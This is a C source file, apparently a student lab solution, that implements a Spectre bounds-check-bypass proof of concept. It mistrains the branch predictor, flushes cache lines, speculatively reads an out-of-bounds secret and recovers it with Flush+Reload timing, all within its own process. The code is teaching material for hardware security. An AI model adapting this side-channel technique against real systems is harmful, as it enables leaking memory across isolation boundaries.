#include "utility.h"
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

#define BUFF_SIZE (1<<21)
#define SAMPLES 100 

/** Write your victim function here */
// Assume secret_array[47] is your secret value
// Assume the bounds check bypass prevents you from loading values above 20
// Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address


//uint8_t array1_size  = 20; 
void victim(int *array1, int *array2, int x, int *array1_size){
    int tmp; 
	clflush(array1_size);

    if(x < array1_size[0]){
        tmp = array2[array1[x]*16]; //*16 is chosen such that it indexes into a cache line  
    }
}



int main(int argc, char **argv)
{
    // Allocate a buffer using huge page
    // See the handout for details about hugepage management
    void *huge_page= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE |
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (huge_page == (void*) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }
    // The first access to a page triggers overhead associated with
    // page allocation, TLB insertion, etc.
    // Thus, we use a dummy write here to trigger page allocation
    // so later access will not suffer from such overhead.
    *((char *)huge_page) = 1; // dummy write to trigger page allocation


    /** STEP 1: Allocate an array into the mmap */
    int *secret_array = (int *)huge_page;
    int array1[256];  // maybe need to initialize this with huge page? 
    int array2[128*1024]; //L1 size 8192 * 4byte elements = 32KiB
    int i,j,k,z,q;
    size_t r;
    int delay=0;
   int tmp; 
  int array1_size[1] = {20};  

    // Initialize the array
    for (int i = 0; i < 100; i++) {
        secret_array[i] = i;
    }

    //printf("Secret array initialized\n");

    for(z =0; z < SAMPLES; z++){
	//printf("Samples loop entered\n");
    /** STEP 2: Mistrain the branch predictor by calling victim function here */ 
    // To prevent any kind of patterns, ensure each time you train it a different number of times

    r =  10 + (rand()%10); // to prevent going above 20 because of bounds check
    //printf("%d\n",r);
    //printf("%d",r);
        for(j = 0; j < r; j++){ 
            victim(array1,array2,r,array1_size);
        }
	//printf("Step2 complete\n");
    /** STEP 3: Clear cache using clflsuh from utility.h */
    for(i = 0; i < 512; i++){ //total 512 lines in the L1 cache 
        clflush(array2 + (i*16));
    }
    //printf("Step3 complete\n");
    //lfence(); 
    /** STEP 4: Call victim function again with bounds bypass value */
    r = (secret_array - array1)+47; 
    //printf("%d\n",r);
    victim(array1,array2,r,array1_size);
    //lfence(); 
    /** STEP 5: Reload mmap to see load times */
    for (k = 0; k < 512; k++){
        delay = measure_one_block_access_time((uint64_t)(array2+(k*16)));
	//printf("%d\n",delay);
        array2[k*16] = array2[k*16] + delay; // delay stored in array2, will check once out of samples loop 
        //printf("%d\n",array2[k*16]);	
    }
    // Just read the mmap's first 100 integers
    
    }
	//printf("%ld\n",r);
	//printf("%d\n",array1[r]);
	int flag = 0; 
    for(i=0;i<512;i++){
	    //printf("%d\n",array2[i*16]);
        if((array2[i*16]/SAMPLES) < 100) {
		printf("\nSecret Value is %d\n",i); 
		flag = 1 ; 
        //else printf("\nCould not Find secret\n");
    }
    }
	if(flag == 0) printf("\nCould not find secret\n");
	else; 
    
    return 0;
}
